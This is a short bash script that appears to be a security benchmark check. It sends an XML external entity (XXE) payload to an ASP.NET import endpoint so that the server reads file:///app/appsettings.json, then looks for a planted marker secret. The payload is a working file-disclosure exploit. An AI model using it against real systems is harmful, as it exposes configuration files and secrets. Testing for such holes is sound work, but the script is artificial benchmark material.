#!/usr/bin/env bash
set -e; . "$(dirname "$0")/_lib.sh"
xml='<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///app/appsettings.json">]><r>&xxe;</r>'
curl -s -X POST "$TARGET/api/import/xml" -H 'content-type: application/xml' --data-binary "$xml" | grep -q 'BenchPlaintextSecret-aspnet-123'
